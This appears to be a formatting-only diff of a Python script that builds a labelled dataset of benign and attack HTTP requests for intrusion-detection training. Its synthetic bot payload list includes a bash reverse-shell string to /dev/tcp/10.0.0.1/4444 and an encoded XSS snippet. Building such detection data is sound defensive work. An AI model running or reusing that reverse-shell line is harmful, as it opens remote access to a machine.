@@ -66,7 +66,9 @@ def wrap_payload(payload: str) -> dict:
         return {
             "method": "POST",
             "uri": "/submit",
-            "headers": _base_headers({"Content-Type": "application/x-www-form-urlencoded"}),
+            "headers": _base_headers(
+                {"Content-Type": "application/x-www-form-urlencoded"}
+            ),
             "body": f"data={payload}",
         }
     else:  # header injection
@@ -144,42 +146,48 @@ def generate_synthetic_benign(count: int = 600) -> list:
         if method in ("POST", "PUT"):
             body = "name=test&value=123"
             headers["Content-Type"] = "application/json"
-        records.append({
-            "request_id": str(uuid.uuid4()),
-            "method": method,
-            "uri": uri,
-            "headers": headers,
-            "body": body,
-            "label": "benign",
-            "attack_family": "benign",
-        })
+        records.append(
+            {
+                "request_id": str(uuid.uuid4()),
+                "method": method,
+                "uri": uri,
+                "headers": headers,
+                "body": body,
+                "label": "benign",
+                "attack_family": "benign",
+            }
+        )
 
     # Static asset requests
     for _ in range(count // 3):
         asset = random.choice(_STATIC_ASSETS)
-        records.append({
-            "request_id": str(uuid.uuid4()),
-            "method": "GET",
-            "uri": asset,
-            "headers": _base_headers(),
-            "body": "",
-            "label": "benign",
-            "attack_family": "benign",
-        })
+        records.append(
+            {
+                "request_id": str(uuid.uuid4()),
+                "method": "GET",
+                "uri": asset,
+                "headers": _base_headers(),
+                "body": "",
+                "label": "benign",
+                "attack_family": "benign",
+            }
+        )
 
     # Form submissions
     while len(records) < count:
         method, uri, body = random.choice(_FORM_ENDPOINTS)
         headers = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
-        records.append({
-            "request_id": str(uuid.uuid4()),
-            "method": method,
-            "uri": uri,
-            "headers": headers,
-            "body": body,
-            "label": "benign",
-            "attack_family": "benign",
-        })
+        records.append(
+            {
+                "request_id": str(uuid.uuid4()),
+                "method": method,
+                "uri": uri,
+                "headers": headers,
+                "body": body,
+                "label": "benign",
+                "attack_family": "benign",
+            }
+        )
 
     return records
 
@@ -187,6 +195,7 @@ def generate_synthetic_benign(count: int = 600) -> list:
 # ---------------------------------------------------------------------------
 # CSV parsers
 # ---------------------------------------------------------------------------
+
 
 def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
     """
@@ -202,7 +211,9 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         except (UnicodeDecodeError, Exception):
             continue
     if df is None:
-        logger.warning("Skipping file %s: could not read CSV with any supported encoding", filename)
+        logger.warning(
+            "Skipping file %s: could not read CSV with any supported encoding", filename
+        )
         return
 
     for row_index, row in df.iterrows():
@@ -210,7 +221,8 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         if "Sentence" not in df.columns:
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing 'Sentence' column",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -219,7 +231,8 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         if pd.isna(sentence) or str(sentence).strip() == "":
             logger.warning(
                 "WARNING: Skipping row %s in %s: empty or null Sentence",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -228,7 +241,8 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         if "Label" not in df.columns:
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing 'Label' column",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -239,7 +253,9 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         except (ValueError, TypeError):
             logger.warning(
                 "WARNING: Skipping row %s in %s: malformed Label value '%s'",
-                row_index, filename, raw_label,
+                row_index,
+                filename,
+                raw_label,
             )
             yield None, True
             continue
@@ -247,7 +263,9 @@ def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
         if label_int not in (0, 1):
             logger.warning(
                 "WARNING: Skipping row %s in %s: unexpected Label value %s",
-                row_index, filename, label_int,
+                row_index,
+                filename,
+                label_int,
             )
             yield None, True
             continue
@@ -292,10 +310,14 @@ def parse_cicids_csv(filepath: str, filename: str):
         try:
             df = pd.read_csv(filepath, on_bad_lines="skip", encoding="latin-1")
         except Exception as exc:
-            logger.warning("WARNING: Skipping file %s: could not read CSV: %s", filename, exc)
+            logger.warning(
+                "WARNING: Skipping file %s: could not read CSV: %s", filename, exc
+            )
             return
     except Exception as exc:
-        logger.warning("WARNING: Skipping file %s: could not read CSV: %s", filename, exc)
+        logger.warning(
+            "WARNING: Skipping file %s: could not read CSV: %s", filename, exc
+        )
         return
 
     # The label column has a leading space in the CICIDS headers
@@ -306,26 +328,29 @@ def parse_cicids_csv(filepath: str, filename: str):
 
     # CICIDS label → (attack_family, HTTP synthesis strategy)
     LABEL_MAP = {
-        "ddos":                    ("ddos",         "flood"),
-        "dos goldeneye":           ("dos",          "flood"),
-        "dos hulk":                ("dos",          "flood"),
-        "dos slowhttptest":        ("dos",          "slowloris"),
-        "dos slowloris":           ("dos",          "slowloris"),
-        "heartbleed":              ("heartbleed",   "heartbleed"),
-        "portscan":                ("portscan",     "portscan"),
-        "bot":                     ("bot",          "bot"),
-        "ftp-patator":             ("brute_force",  "ftp_brute"),
-        "ssh-patator":             ("brute_force",  "ssh_brute"),
+        "ddos": ("ddos", "flood"),
+        "dos goldeneye": ("dos", "flood"),
+        "dos hulk": ("dos", "flood"),
+        "dos slowhttptest": ("dos", "slowloris"),
+        "dos slowloris": ("dos", "slowloris"),
+        "heartbleed": ("heartbleed", "heartbleed"),
+        "portscan": ("portscan", "portscan"),
+        "bot": ("bot", "bot"),
+        "ftp-patator": ("brute_force", "ftp_brute"),
+        "ssh-patator": ("brute_force", "ssh_brute"),
         "web attack \ufffd brute force": ("brute_force", "web_brute"),
-        "web attack \ufffd sql injection": ("sqli",  "sqli"),
-        "web attack \ufffd xss":   ("xss",          "xss"),
-        "infiltration":            ("infiltration", "infiltration"),
+        "web attack \ufffd sql injection": ("sqli", "sqli"),
+        "web attack \ufffd xss": ("xss", "xss"),
+        "infiltration": ("infiltration", "infiltration"),
     }
 
     _FLOOD_URIS = ["/", "/index.html", "/api/data", "/search", "/home"]
     _BOT_PAYLOADS = [
-        "cmd=whoami", "exec=ls+-la", "shell=bash+-i+>&+/dev/tcp/10.0.0.1/4444+0>&1",
-        "payload=dXNlcjpwYXNz", "data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "cmd=whoami",
+        "exec=ls+-la",
+        "shell=bash+-i+>&+/dev/tcp/10.0.0.1/4444+0>&1",
+        "payload=dXNlcjpwYXNz",
+        "data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
     ]
 
     def _synthesise(strategy: str, row: pd.Series) -> tuple[str, str, dict, str]:
@@ -337,7 +362,9 @@ def parse_cicids_csv(filepath: str, filename: str):
             return ("GET", random.choice(_FLOOD_URIS), _base_headers(), "")
 
         if strategy == "slowloris":
-            hdrs = _base_headers({"Connection": "keep-alive", "Content-Length": "9999999"})
+            hdrs = _base_headers(
+                {"Connection": "keep-alive", "Content-Length": "9999999"}
+            )
             return ("POST", "/", hdrs, "")
 
         if strategy == "heartbleed":
@@ -386,7 +413,8 @@ def parse_cicids_csv(filepath: str, filename: str):
         if not raw_label or raw_label.lower() == "nan":
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing Label",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -428,7 +456,9 @@ def parse_cicids_csv(filepath: str, filename: str):
             strategy = "flood"
             logger.warning(
                 "WARNING: Unknown CICIDS label '%s' at row %s in %s — mapped to unknown_attack",
-                raw_label, row_index, filename,
+                raw_label,
+                row_index,
+                filename,
             )
 
         method, uri, headers, body = _synthesise(strategy, row)
@@ -461,7 +491,8 @@ def parse_csic_csv(filepath: str, filename: str):
     if missing:
         logger.warning(
             "WARNING: Skipping entire file %s: missing required columns %s",
-            filename, missing,
+            filename,
+            missing,
         )
         return
 
@@ -473,7 +504,8 @@ def parse_csic_csv(filepath: str, filename: str):
         if not method or method.lower() == "nan":
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing Method",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -481,7 +513,8 @@ def parse_csic_csv(filepath: str, filename: str):
         if not url or url.lower() == "nan":
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing URL",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -489,7 +522,8 @@ def parse_csic_csv(filepath: str, filename: str):
         if not classification or classification.lower() == "nan":
             logger.warning(
                 "WARNING: Skipping row %s in %s: missing classification",
-                row_index, filename,
+                row_index,
+                filename,
             )
             yield None, True
             continue
@@ -515,7 +549,11 @@ def parse_csic_csv(filepath: str, filename: str):
             headers["Host"] = host
 
         content = row.get("content")
-        body = str(content).strip() if pd.notna(content) and str(content).strip() not in ("", "nan") else ""
+        body = (
+            str(content).strip()
+            if pd.notna(content) and str(content).strip() not in ("", "nan")
+            else ""
+        )
 
         # Strip HTTP version suffix from URL if present (e.g. "http://... HTTP/1.1")
         if " HTTP/" in url:
@@ -524,6 +562,7 @@ def parse_csic_csv(filepath: str, filename: str):
         # Extract URI path from full URL
         try:
             from urllib.parse import urlparse
+
             parsed = urlparse(url)
             uri = parsed.path or "/"
             if parsed.query:
@@ -547,6 +586,7 @@ def parse_csic_csv(filepath: str, filename: str):
 # Main pipeline
 # ---------------------------------------------------------------------------
 
+
 def process_datasets():
     os.makedirs(OUTPUT_DIR, exist_ok=True)
 
@@ -557,9 +597,10 @@ def process_datasets():
     benign_count = 0
     skipped_count = 0
 
-    with open(attack_path, "w", encoding="utf-8") as attack_f, \
-         open(benign_path, "w", encoding="utf-8") as benign_f:
-
+    with (
+        open(attack_path, "w", encoding="utf-8") as attack_f,
+        open(benign_path, "w", encoding="utf-8") as benign_f,
+    ):
         # --- SQLi CSVs ---
         for filename in ("SQLiV3.csv", "sqli.csv", "sqliv2.csv"):
             filepath = os.path.join(RAW_DATA_DIR, filename)
@@ -644,7 +685,7 @@ def process_datasets():
             benign_f.write(json.dumps(record) + "\n")
             benign_count += 1
 
-    print(f"\nSummary:")
+    print("\nSummary:")
     print(f"  Total attacks written : {attack_count}")
     print(f"  Total benign written  : {benign_count}")
     print(f"  Total rows skipped    : {skipped_count}")
